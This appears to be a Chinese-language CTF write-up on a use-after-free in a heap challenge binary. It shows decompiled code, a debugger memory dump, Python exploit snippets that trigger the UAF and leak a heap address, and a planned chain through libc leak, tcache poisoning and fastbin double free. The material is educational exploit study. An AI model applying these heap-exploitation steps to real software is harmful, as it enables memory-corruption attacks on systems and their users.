# UAF

![image-20200506223935280](/Users/migraine/Library/Application Support/typora-user-images/image-20200506223935280.png)

```c
int sub_EBE()
{
  puts("1. add");
  puts("2. delete");
  puts("3. show");
  puts("4. exit");
  return printf("your choice: ");
}
```



```c
  else
  {
    printf("size: ");
    v3 = sub_AA0();
    if ( v3 <= 0 || v3 > 111 )
    {
      puts("The size is wrong!");
    }
    else
    {
      memset(&s, 0, 0x20uLL);
      printf("remark: ", 0LL);
      sub_A3A((unsigned __int8 *)&s, 24);
      strncpy((char *)&unk_202060 + 48 * v2 + 16, &s, 0x28uLL); //char* 类型,存放remark
      qword_202068[6 * v2] = (unsigned __int8 *)malloc(v3);
      printf("data: ", &s);
      sub_A3A(qword_202068[6 * v2], v3); //char_8 类型，指向存放data的chunk
      *((_DWORD *)&unk_202060 + 12 * v2) = 0;//将free位设置为0
      puts("Success!");
    }
  }
```

存放chunk指针的数组结构如下

```c
pwndbg> x/20xg 0x564d8225a000+0x202060                                                                                       │0x564d8245c060: 0x0000000000000000<-- free      0x0000564d82d10260  -->chunk_0-->data                                                                              │0x564d8245c070: 0x0000000061616161<-- remark    0x0000000000000000                                                                                       │0x564d8245c080: 0x0000000000000000      				0x0000000000000000                                                                             │0x564d8245c090: 0x0000000000000000<-- free      0x0000564d82d10290  -->chunk_1-->data                                                                                             │0x564d8245c0a0: 0x0000000062626262<-- remark    0x0000000000000000
```

这里的uaf一开始居然没看出来，实际上这个UAF还是比较典型的。

free之后程序没有**删除指针**。每一次申请内存都会遍历数组结构，找到空闲的结构，我们只需要保护我们释放的指针的那块结构不被下一次申请覆盖，就可以构造出UAF。

```c
  for ( i = 0; i <= 0xF; ++i )
  {
    if ( !qword_202068[6 * (signed int)i] || *((_DWORD *)&unk_202060 + 12 * (signed int)i) == 1 )
    {
      v2 = i;
      break;
    }
  }
```

DEMO

```python
add(0x18,"aaa","AAAA")#此出产生的数组结构，为了chunk_c的数组结构留空白。
add(0x20,"bbb","BBBB")#chunk_b
delete(0)#chunk_a #之后的chunk_c的指针结构留位置
delete(1)#chunk_b #之后的chunk_c的data位置
add(0x20,"ccc","CCCC")
```

构造之后，发现我们同时有两块结构体都指向了free_chunk_b.

![lKhJXb](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/lKhJXb.png)

不过这个UAF貌似只能读不能写。。。似乎有一些鸡肋。不过可以写一个泄露堆地址的利用。

```python
add(0x18,"xxx","x"*0x10)
add(0x18,"yyy","y"*0x10)

add(0x20,"aaa","a"*0x10)
add(0x20,"bbb","b"*0x10)
delete(0)
delete(1)
delete(2)
delete(3)

add(0x20,"ccc","0")
show(0)
p.recv(5)
heap=u64(p.recv(6).ljust(8,b"\x00"))-0x230
print("heap="+hex(heap))
```

![h3ZuvJ](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/h3ZuvJ.png)

目前一个思路:泄露程序基地址->获得got表地址->泄露libc地址->tache poisoning

需要绕过的难点是如何修改tache的fd，不过可以考虑构造double free。但是libc-2.29中的tache已经加强了，很难直接double free。[参考](https://xz.aliyun.com/t/7292)

所以也许可以退而求其次，申请7个chunk，然后使用fastbin的double free。

